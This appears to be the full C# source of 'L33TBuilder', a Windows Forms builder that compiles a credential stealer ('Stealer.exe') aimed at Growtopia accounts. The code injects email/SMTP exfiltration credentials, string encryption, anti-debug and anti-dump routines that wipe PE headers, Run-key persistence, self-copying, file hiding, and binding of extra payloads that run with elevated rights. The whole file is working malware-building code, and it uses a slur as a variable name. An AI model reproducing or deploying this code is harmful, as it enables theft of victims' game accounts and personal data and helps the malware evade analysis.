/// <summary>
/// Made by Cursedsheep ;D
/// </summary>
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.CodeDom.Compiler;
using Microsoft.Win32;
using System.Net;
using System.Management;
using System.Collections.Specialized;
using System.Drawing.Imaging;

namespace L33TBuilder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public static string jafajwj = "aqnjrt4g56jn4ws564g154t5sa4e4agbg8n97";
        private static string initVector = "r5dm5fgm24mfhfku";
        private const int keysize = 256;
        public static string encryptString(string plainText, string passPhrase)
        {
            byte[] initVectorBytes = Encoding.UTF8.GetBytes(initVector);
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            PasswordDeriveBytes password = new PasswordDeriveBytes(passPhrase, null);
            byte[] keyBytes = password.GetBytes(keysize / 16);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            symmetricKey.Mode = CipherMode.CBC;
            ICryptoTransform encryptor = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write);
            cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
            cryptoStream.FlushFinalBlock();
            byte[] cipherTextBytes = memoryStream.ToArray();
            memoryStream.Close();
            cryptoStream.Close();
            return Convert.ToBase64String(cipherTextBytes);
        }
        static Random strchange65 = new Random();
        public static string genrandomkey()
        {
            int strchange64 = strchange65.Next(30, 80);
            const string strchange66 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=-";
            return new string(Enumerable.Repeat(strchange66, strchange64)
              .Select(strchange67 => strchange67[strchange65.Next(strchange67.Length)]).ToArray());
        }
        public string ProcessStealer(string code)
        {
            string str = code;
            string msg = @"""Stealer with AAP bypass by CursedSheep ;D"" + Environment.NewLine + ""GrowID: "" + strchange98(strchange111) + Environment.NewLine + ""IP: "" + ipxd + ""PC name: "" + Environment.UserName + "" / "" + Environment.MachineName + Environment.NewLine + ""Mac Address: "" + strchange103";
                string nonsskan = @"                strchange138 = new MailMessage(""[emailxdreplace]"", ""[emailxdreplace]"", strchange129, strchange130);
                strchange139.Credentials = new NetworkCredential(""[emailxdreplace]"", ""[passxdreplace]"");";
                if (ProtectStr.Checked == true)
                {
                    string decmethod = @"        public static string jafajwj = ""aqnjrt4g56jn4ws564g154t5sa4e4agbg8n97"";
        private static string initVector = ""r5dm5fgm24mfhfku"";
        private const int keysize = 256;
        public static string Copy(string yweuytgeatawghgtqajwerqujtqw, string passPhrase)
        {
            byte[] initVectorBytes = Encoding.ASCII.GetBytes(initVector);
            byte[] cipherTextBytes = Convert.FromBase64String(yweuytgeatawghgtqajwerqujtqw);
            PasswordDeriveBytes password = new PasswordDeriveBytes(passPhrase, null);
            byte[] keyBytes = password.GetBytes(keysize / 16);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            //symmetricKey.Padding = PaddingMode.None;
            symmetricKey.Mode = CipherMode.CBC;
            ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes);
            MemoryStream memoryStream = new MemoryStream(cipherTextBytes);
            CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read);
            byte[] plainTextBytes = new byte[cipherTextBytes.Length];
            int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
            memoryStream.Close();
            cryptoStream.Close();
            return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
        }";
                    str = str.Replace("//strdecmethodrepxdddd", decmethod);
                    string genedkey = genrandomkey();
                    string genedkey2 = genrandomkey();
                    nonsskan = nonsskan.Replace(@"""[emailxdreplace]""", @"Copy(" + @""""+ encryptString(Emailtxt.Text, genedkey) + @"""" + ", " + @"""" + genedkey + @"""" + ")").Replace(@"""[passxdreplace]""", @"Copy(" + @"""" + encryptString(Passwordtxt.Text, genedkey2) + @"""" + ", " + @"""" + genedkey2 + @"""" + ")");
                }
                else
                {
                    nonsskan = nonsskan.Replace("[emailxdreplace]", Emailtxt.Text).Replace("[passxdreplace]", Passwordtxt.Text);
                }
                str = str.Replace(@"//networkstuffherexd", nonsskan);
            if (AntiDebug.Checked == true)
            {
                string dbgmethid = @"        [DllImport(""kernel32.dll"", CharSet = CharSet.Auto, ExactSpelling = true)]
        internal static extern bool IsDebuggerPresent();
        public static void chlkaofkasdogsgifsj()
        {
            if (Debugger.IsAttached || IsDebuggerPresent())
            {
                Environment.Exit(-1);
            }
        }";
                string dbgcall = @"            Thread faggot = new Thread(chlkaofkasdogsgifsj);
            faggot.IsBackground = true;
            faggot.Start();";
                str = str.Replace("//debuggerxddddddddd", dbgmethid);
                str = str.Replace("//debugcallxdddd", dbgcall);

            }
            if(AntiDump.Checked == true)
            {
                string antidumpmethod = @"        [DllImport(""kernel32.dll"", EntryPoint = ""VirtualProtectEx"", SetLastError = true)]
        static extern unsafe bool VirtualProtectEx(IntPtr hProcess, byte* lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport(""kernel32.dll"", EntryPoint = ""OpenProcess"", SetLastError = true)]
        public static extern IntPtr OpenProcess(
uint processAccess,
bool bInheritHandle,
int processId
);
        public static unsafe void Initialize()
        {
            uint old;
            Module module = typeof(strchange143).Module;
            IntPtr prafadfa = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
            var bas = (byte*)Marshal.GetHINSTANCE(module);
            byte* ptr = bas + 0x3c;
            byte* ptr2;
            ptr = ptr2 = bas + *(uint*)ptr;
            ptr += 0x6;
            ushort sectNum = *(ushort*)ptr;
            ptr += 14;
            ushort optSize = *(ushort*)ptr;
            ptr = ptr2 = ptr + 0x4 + optSize;

            byte* @new = stackalloc byte[11];
            if (module.FullyQualifiedName[0] != '<') //Mapped
            {
                //VirtualProtect(ptr - 16, 8, 0x40, out old);
                //*(uint*)(ptr - 12) = 0;
                byte* mdDir = bas + *(uint*)(ptr - 16);
                //*(uint*)(ptr - 16) = 0;

                if (*(uint*)(ptr - 0x78) != 0)
                {
                    byte* importDir = bas + *(uint*)(ptr - 0x78);
                    byte* oftMod = bas + *(uint*)importDir;
                    byte* modName = bas + *(uint*)(importDir + 12);
                    byte* funcName = bas + *(uint*)oftMod + 2;
                    VirtualProtectEx(prafadfa, modName, 11, 0x40, out old);

                    *(uint*)@new = 0x6c64746e;
                    *((uint*)@new + 1) = 0x6c642e6c;
                    *((ushort*)@new + 4) = 0x006c;
                    *(@new + 10) = 0;

                    for (int i = 0; i < 11; i++)
                        *(modName + i) = *(@new + i);

                    VirtualProtectEx(prafadfa, funcName, 11, 0x40, out old);

                    *(uint*)@new = 0x6f43744e;
                    *((uint*)@new + 1) = 0x6e69746e;
                    *((ushort*)@new + 4) = 0x6575;
                    *(@new + 10) = 0;

                    for (int i = 0; i < 11; i++)
                        *(funcName + i) = *(@new + i);
                }

                for (int i = 0; i < sectNum; i++)
                {
                    VirtualProtectEx(prafadfa, ptr, 8, 0x40, out old);
                    Marshal.Copy(new byte[8], 0, (IntPtr)ptr, 8);
                    ptr += 0x28;
                }
                VirtualProtectEx(prafadfa, mdDir, 0x48, 0x40, out old);
                byte* mdHdr = bas + *(uint*)(mdDir + 8);
                *(uint*)mdDir = 0;
                *((uint*)mdDir + 1) = 0;
                *((uint*)mdDir + 2) = 0;
                *((uint*)mdDir + 3) = 0;

                VirtualProtectEx(prafadfa, mdHdr, 4, 0x40, out old);
                *(uint*)mdHdr = 0;
                mdHdr += 12;
                mdHdr += *(uint*)mdHdr;
                mdHdr = (byte*)(((ulong)mdHdr + 7) & ~3UL);
                mdHdr += 2;
                ushort numOfStream = *mdHdr;
                mdHdr += 2;
                for (int i = 0; i < numOfStream; i++)
                {
                    VirtualProtectEx(prafadfa, mdHdr, 8, 0x40, out old);
                    //*(uint*)mdHdr = 0;
                    mdHdr += 4;
                    //*(uint*)mdHdr = 0;
                    mdHdr += 4;
                    for (int ii = 0; ii < 8; ii++)
                    {
                        VirtualProtectEx(prafadfa, mdHdr, 4, 0x40, out old);
                        *mdHdr = 0;
                        mdHdr++;
                        if (*mdHdr == 0)
                        {
                            mdHdr += 3;
                            break;
                        }
                        *mdHdr = 0;
                        mdHdr++;
                        if (*mdHdr == 0)
                        {
                            mdHdr += 2;
                            break;
                        }
                        *mdHdr = 0;
                        mdHdr++;
                        if (*mdHdr == 0)
                        {
                            mdHdr += 1;
                            break;
                        }
                        *mdHdr = 0;
                        mdHdr++;
                    }
                }
            }
            else //Flat
            {
                //VirtualProtect(ptr - 16, 8, 0x40, out old);
                //*(uint*)(ptr - 12) = 0;
                uint mdDir = *(uint*)(ptr - 16);
                //*(uint*)(ptr - 16) = 0;
                uint importDir = *(uint*)(ptr - 0x78);

                var vAdrs = new uint[sectNum];
                var vSizes = new uint[sectNum];
                var rAdrs = new uint[sectNum];
                for (int i = 0; i < sectNum; i++)
                {
                    VirtualProtectEx(prafadfa, ptr, 8, 0x40, out old);
                    Marshal.Copy(new byte[8], 0, (IntPtr)ptr, 8);
                    vAdrs[i] = *(uint*)(ptr + 12);
                    vSizes[i] = *(uint*)(ptr + 8);
                    rAdrs[i] = *(uint*)(ptr + 20);
                    ptr += 0x28;
                }


                if (importDir != 0)
                {
                    for (int i = 0; i < sectNum; i++)
                        if (vAdrs[i] <= importDir && importDir < vAdrs[i] + vSizes[i])
                        {
                            importDir = importDir - vAdrs[i] + rAdrs[i];
                            break;
                        }
                    byte* importDirPtr = bas + importDir;
                    uint oftMod = *(uint*)importDirPtr;
                    for (int i = 0; i < sectNum; i++)
                        if (vAdrs[i] <= oftMod && oftMod < vAdrs[i] + vSizes[i])
                        {
                            oftMod = oftMod - vAdrs[i] + rAdrs[i];
                            break;
                        }
                    byte* oftModPtr = bas + oftMod;
                    uint modName = *(uint*)(importDirPtr + 12);
                    for (int i = 0; i < sectNum; i++)
                        if (vAdrs[i] <= modName && modName < vAdrs[i] + vSizes[i])
                        {
                            modName = modName - vAdrs[i] + rAdrs[i];
                            break;
                        }
                    uint funcName = *(uint*)oftModPtr + 2;
                    for (int i = 0; i < sectNum; i++)
                        if (vAdrs[i] <= funcName && funcName < vAdrs[i] + vSizes[i])
                        {
                            funcName = funcName - vAdrs[i] + rAdrs[i];
                            break;
                        }
                    VirtualProtectEx(prafadfa, bas + modName, 11, 0x40, out old);

                    *(uint*)@new = 0x6c64746e;
                    *((uint*)@new + 1) = 0x6c642e6c;
                    *((ushort*)@new + 4) = 0x006c;
                    *(@new + 10) = 0;

                    for (int i = 0; i < 11; i++)
                        *(bas + modName + i) = *(@new + i);

                    VirtualProtectEx(prafadfa, bas + funcName, 11, 0x40, out old);

                    *(uint*)@new = 0x6f43744e;
                    *((uint*)@new + 1) = 0x6e69746e;
                    *((ushort*)@new + 4) = 0x6575;
                    *(@new + 10) = 0;

                    for (int i = 0; i < 11; i++)
                        *(bas + funcName + i) = *(@new + i);
                }


                for (int i = 0; i < sectNum; i++)
                    if (vAdrs[i] <= mdDir && mdDir < vAdrs[i] + vSizes[i])
                    {
                        mdDir = mdDir - vAdrs[i] + rAdrs[i];
                        break;
                    }
                byte* mdDirPtr = bas + mdDir;
                VirtualProtectEx(prafadfa, mdDirPtr, 0x48, 0x40, out old);
                uint mdHdr = *(uint*)(mdDirPtr + 8);
                for (int i = 0; i < sectNum; i++)
                    if (vAdrs[i] <= mdHdr && mdHdr < vAdrs[i] + vSizes[i])
                    {
                        mdHdr = mdHdr - vAdrs[i] + rAdrs[i];
                        break;
                    }
                *(uint*)mdDirPtr = 0;
                *((uint*)mdDirPtr + 1) = 0;
                *((uint*)mdDirPtr + 2) = 0;
                *((uint*)mdDirPtr + 3) = 0;


                byte* mdHdrPtr = bas + mdHdr;
                VirtualProtectEx(prafadfa, mdHdrPtr, 4, 0x40, out old);
                *(uint*)mdHdrPtr = 0;
                mdHdrPtr += 12;
                mdHdrPtr += *(uint*)mdHdrPtr;
                mdHdrPtr = (byte*)(((ulong)mdHdrPtr + 7) & ~3UL);
                mdHdrPtr += 2;
                ushort numOfStream = *mdHdrPtr;
                mdHdrPtr += 2;
                for (int i = 0; i < numOfStream; i++)
                {
                    VirtualProtectEx(prafadfa, mdHdrPtr, 8, 0x40, out old);
                    //*(uint*)mdHdrPtr = 0;
                    mdHdrPtr += 4;
                    //*(uint*)mdHdrPtr = 0;
                    mdHdrPtr += 4;
                    for (int ii = 0; ii < 8; ii++)
                    {
                        VirtualProtectEx(prafadfa, mdHdrPtr, 4, 0x40, out old);
                        *mdHdrPtr = 0;
                        mdHdrPtr++;
                        if (*mdHdrPtr == 0)
                        {
                            mdHdrPtr += 3;
                            break;
                        }
                        *mdHdrPtr = 0;
                        mdHdrPtr++;
                        if (*mdHdrPtr == 0)
                        {
                            mdHdrPtr += 2;
                            break;
                        }
                        *mdHdrPtr = 0;
                        mdHdrPtr++;
                        if (*mdHdrPtr == 0)
                        {
                            mdHdrPtr += 1;
                            break;
                        }
                        *mdHdrPtr = 0;
                        mdHdrPtr++;
                    }
                }
            }
        }";
                str = str.Replace("//antidumpheremethod", antidumpmethod);
                str = str.Replace("//antidumpinit", "Initialize();");
            }
            if(RegularStartup.Checked == true)
            {
                str = str.Replace("//addnormalstartupxdd", @"            using (RegistryKey " + "regk" + @" = Registry.LocalMachine.OpenSubKey(@""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true))
            {
                try{" + "regk" + @".SetValue(" + "Path.GetFileNameWithoutExtension(Application.ExecutablePath)" + @", @"""""""" + Application.ExecutablePath + @"""""""");}catch{}
            }");
            }
            if(CopyStealer.Checked == true)
            {
                str = str.Replace("//copyfilewtfffxd", @"            string pathexefdfdaf = Environment.ExpandEnvironmentVariables(""[EnvironmentVarxd]"") + @""\"" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
            if (System.Reflection.Assembly.GetEntryAssembly().Location != pathexefdfdaf)
            {
                try
                {
                 File.Delete(pathexefdfdaf);
                }
                 catch{}
                File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, pathexefdfdaf);
                Thread.Sleep(300);
                Process.Start(pathexefdfdaf);
                Thread.Sleep(500);
                Environment.Exit(0);
            }");
            }
            if(HideFile.Checked == true)
            {
                str = str.Replace("//hidefileomglolok", @"            try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
            }
            if (listView1.Items.Count > 0)
            {
                string methodxd = @"        static void ThisMethodxd()
        {
            //startuplolp
            string sjnfnos = Environment.ExpandEnvironmentVariables(""replacexdgggggg36346365"");
            //string gripo = ""bit098"";

            //hidexdsfng
        }
        public static void extract2idk(string resourceName, string fileName, bool lmao, bool admin)
        {
            using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resource.CopyTo(file);
                }
            }
            if (lmao == true)
            {
                if (admin == true)
                {
                    ProcessStartInfo prcs3 = new ProcessStartInfo(fileName)
                    {
                        RedirectStandardError = false,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = false,
                        Verb = ""run as""
                    };
                    Process.Start(prcs3);
                }
                else
                {
                    Process.Start(fileName);
                }
            }
        }";
                int index = methodxd.IndexOf(@"bit098"";");
                string newgj = methodxd;
                newgj = newgj.Replace("replacexdgggggg36346365", DropTxt2.Text);
                foreach (ListViewItem iasjfd in listView1.Items)
                {
                    if (HideFilesBinded.Checked == true)
                    {
                        newgj = newgj.Insert(index, Environment.NewLine + @"try{File.SetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", File.GetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""") | FileAttributes.Hidden | FileAttributes.System); }catch{}");
                    }
                    newgj = newgj.Insert(index, Environment.NewLine + @"extract2idk(""" + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", " + iasjfd.SubItems[1].Text + @", " + iasjfd.SubItems[2].Text + @");");
                    if (HideFilesBinded.Checked == true)
                    {
                        newgj = newgj.Insert(index, Environment.NewLine + @"try{File.SetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", FileAttributes.Normal); }catch{}");
                    }
                }
                str = str.Replace("//insertbindmethods", newgj);
                str = str.Replace("//callbindmethodxd", @"if(System.Reflection.Assembly.GetEntryAssembly().Location != Environment.ExpandEnvironmentVariables(""[EnvironmentVarxd]"") + @""\"" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location)){ThisMethodxd();}");
            }
            str = str.Replace("[EnvironmentVarxd]", DropPathtxt.Text);
            str = str.Replace("[9rands]", Get9RND()).Replace("[5rands]", Get5RND());
            string fdga = grab5keys();
            string fdga2 = grab9keys();
            str = str.Replace("//changelistgggg5", @"string[] listggg5 = { " + fdga + @"};");
            str = str.Replace("//changelistgggg9", @"string[] listggg9 = { " + fdga2 + @"};");
            msg += ";";
            str = str.Replace("[SMTPPORTXD]", SMTPPORT.Text).Replace("[SMTPReP]", SMTPSERVER.Text).Replace("//messageemailxd", msg);
            return str;
        }
        public static string grab5keys()
        {
            string f5keys = "";
            RegistryKey reg5num = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft");
            foreach (string subKeyName in reg5num.GetSubKeyNames())
            {
                if (Regex.IsMatch(subKeyName, "^[0-9]+$", RegexOptions.Compiled) && subKeyName.Length == 5)
                {
                    RegistryKey og = reg5num.OpenSubKey(subKeyName);
                    foreach (var ggfg in og.GetValueNames())
                    {
                        f5keys += @"""" + ggfg + @"""" + ",";
                    }
                }
            }
            return f5keys.TrimEnd(',');
        }
        public static string grab9keys()
        {
            string f9keys = "";
            RegistryKey subKey = Registry.CurrentUser;
            foreach (string subKeyName in subKey.GetSubKeyNames())
            {
                if (Regex.IsMatch(subKeyName, "^[0-9]+$", RegexOptions.Compiled) && subKeyName.Length == 9)
                {
                    RegistryKey ghjk = subKey.OpenSubKey(subKeyName);
                    string[] okg = subKey.OpenSubKey(subKeyName).GetValueNames();
                    foreach (var s in okg)
                    {
                        //string gdg = (string)ghjk.GetValue(s);
                        f9keys += @"""" + s + @"""" + ",";
                    }
                    break;
                }
            }
            return f9keys.TrimEnd(',');
        }
        public static string Get5RND()
        {
            try
            {
                RegistryKey jdfddnjdz = Registry.CurrentUser;
                jdfddnjdz = jdfddnjdz.OpenSubKey(@"Software\Microsoft", true);
                string[] dshg = jdfddnjdz.GetSubKeyNames();
                foreach (String umm in dshg)
                {
                    if (Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length == 5)
                    {
                        return umm;
                    }
                    else if (!Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length != 5)
                    {

                    }
                }
                return "NULL";
            }
            catch
            {
                return "NULL";
            }
        }
        public static string Get9RND()
        {
            try
            {
                RegistryKey subKey = Registry.CurrentUser;
                string[] subkeyNemez = subKey.GetSubKeyNames();
                foreach (String valuef in subkeyNemez)
                {
                    if (Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length == 9)
                    {
                        return valuef;
                    }
                    else if (!Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length != 9)
                    {

                    }
                }
                return "NULL";
            }
            catch
            {
                return "NULL";
            }
        }
        public void compile2(string path)
        {
            string stubdec = Properties.Resources.Code;
            stubdec = ProcessStealer(stubdec);
            List<string> codexd = new List<string>();
            codexd.Add(stubdec);
            string manifestdec = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""highestAvailable"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>

  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
            //File.WriteAllText("dbg.txt", stubdec);
            File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifestdec);
            //File.WriteAllText("as2f.txt", rep2);
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters compars = new CompilerParameters();
            compars.ReferencedAssemblies.Add("System.Net.dll");
            compars.ReferencedAssemblies.Add("System.dll");
            compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compars.ReferencedAssemblies.Add("System.Drawing.dll");
            compars.ReferencedAssemblies.Add("System.Management.dll");
            compars.ReferencedAssemblies.Add("System.IO.dll");
            compars.ReferencedAssemblies.Add("System.IO.compression.dll");
            compars.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
            compars.ReferencedAssemblies.Add("System.Core.dll");
            compars.ReferencedAssemblies.Add("System.Security.dll");
            bool hasAdmin = false;
            if (listView1.Items.Count > 0)
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    compars.EmbeddedResources.Add("" + item.SubItems[0].Text + "");
                    if(item.SubItems[2].Text.Contains("true"))
                    {
                        hasAdmin = true;
                    }
                }
            }
            compars.GenerateExecutable = true;
            compars.OutputAssembly = path;
            compars.GenerateInMemory = false;
            compars.TreatWarningsAsErrors = false;
            compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";
            if(hasAdmin == true)
            {
                compars.CompilerOptions += " /win32manifest:" + @"""" + Application.StartupPath + @"\manifest.manifest" + @"""";
            }
            if (!string.IsNullOrEmpty(IconPAthxd.Text) || !string.IsNullOrWhiteSpace(IconPAthxd.Text) && IconPAthxd.Text.Contains(@"\") && IconPAthxd.Text.Contains(@":") && IconPAthxd.Text.Length >= 7)
            {
                if(isvalidFilepath(IconPAthxd.Text))
                {
                    compars.CompilerOptions += " /win32icon:" + @"""" + IconPAthxd.Text + @"""";
                }
                else
                {
                    MessageBox.Show("Path possibly invalid!", "Error!");
                    return;
                }
            }
            else if (string.IsNullOrEmpty(IconPAthxd.Text) || string.IsNullOrWhiteSpace(IconPAthxd.Text))
            {

            }
            else
            {
                MessageBox.Show("Path possibly invalid!", "Error!");
                return;
            }
            System.Threading.Thread.Sleep(100);
            CompilerResults res = provider.CompileAssemblyFromSource(compars, codexd.ToArray());

            if (res.Errors.Count > 0)
            {
                try
                {
                    File.Delete(Application.StartupPath + @"\manifest.manifest");
                }
                catch { }
                foreach (CompilerError ce in res.Errors)
                {
                    MessageBox.Show(ce.ToString());
                }
            }
            else
            {
                try
                {
                    File.Delete(Application.StartupPath + @"\manifest.manifest");
                }
                catch { }
              MessageBox.Show("Done building stealer!");
            }
        }
        private void BrowseIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Icon files (*.ico)|*.ico";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                IconPAthxd.Text = ofd.FileName;
            }
            else
            {

            }
        }
        public static int ghp { get; set; }
        public void timer_Tick(object sender, EventArgs e)
        {
            if (ghp == 240)
            {
                ghp = 0;
            }
            else
            {
                ghp++;


                label8.ForeColor = ColorTranslator.FromWin32(ColorHLSToRGB(ghp, 100, 150));
            }
        }
        [DllImport("shlwapi.dll")]
        public static extern int ColorHLSToRGB(int H, int L, int S);
        private void Form1_Load(object sender, EventArgs e)
        {
            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 1;
            timer.Tick += new EventHandler(timer_Tick);
            timer.Enabled = true;
            timer.Start();
            tabPage1.BackColor = Color.Black;
            tabPage2.BackColor = Color.Black;
            DropPathtxt.Enabled = false;
            //Passwordtxt.PasswordChar = '\u25CF';
            Passwordtxt.UseSystemPasswordChar = PasswordPropertyTextAttribute.Yes.Password;
        }
        private void BuildStealer_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "Stealer.exe";
            sfd.Filter = "Exe files (Obviously) (*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                compile2(sfd.FileName);
            }
            else { return; }
        }

        private void CopyStealer_CheckedChanged(object sender, EventArgs e)
        {
           if(CopyStealer.Checked == true)
            {
                DropPathtxt.Enabled = true;
            }
           else
            {
                DropPathtxt.Enabled = false;
            }
        }

        private void ProtectStr_Click(object sender, EventArgs e)
        {

        }

        private void AddFilesToBind_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string[] itemsf = { ofd.FileName, "true", "false" };
                ListViewItem ajnisdfin = new ListViewItem(itemsf);
                listView1.Items.Add(ajnisdfin);
            }
            else
            {
                return;
            }
        }

        private void listView1_DragDrop(object sender, DragEventArgs e)
        {
            string[] data = (string[])e.Data.GetData(DataFormats.FileDrop, false);
            foreach(string s in data)
            {
                string[] theitems = { s, "true", "false" };
                ListViewItem djf = new ListViewItem(theitems);
                listView1.Items.Add(djf);
            }
        }

        private void listView1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
            else
                e.Effect = DragDropEffects.None;
        }

        private void RemoveSelected_Click(object sender, EventArgs e)
        {
            if(listView1.Items.Count > 0)
            {
                listView1.SelectedItems[0].Remove();
            }
        }
        public bool isvalidFilepath(string path)
        {
            try
            {
                string[] splitg = path.Split(':');
                if (path.Length >= 6 && path.Contains(@":\") && splitg[0].Length == 1 && Regex.IsMatch(splitg[0], @"^[a-zA-Z]+$"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }
        private void ToggleExe_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text == "true")
            {
                listView1.SelectedItems[0].SubItems[1].Text = "false";
            }
            else if (listView1.SelectedItems[0].SubItems[1].Text == "false")
            {
                listView1.SelectedItems[0].SubItems[1].Text = "true";
            }
        }

        private void ToggleRunAsAdmin_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[2].Text == "true")
            {
                listView1.SelectedItems[0].SubItems[2].Text = "false";
            }
            else if (listView1.SelectedItems[0].SubItems[2].Text == "false")
            {
                listView1.SelectedItems[0].SubItems[2].Text = "true";
            }
        }

        private void label8_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCpbHU8fNTw5DOUgsWbX62-A");
        }

        private void Showpassxd_CheckedChanged(object sender, EventArgs e)
        {
            if(Showpassxd.Checked == true)
            {
                Passwordtxt.UseSystemPasswordChar = PasswordPropertyTextAttribute.No.Password;
            }
            else if (Showpassxd.Checked == false)
            {
                Passwordtxt.UseSystemPasswordChar = PasswordPropertyTextAttribute.Yes.Password;
            }
        }
    }
}
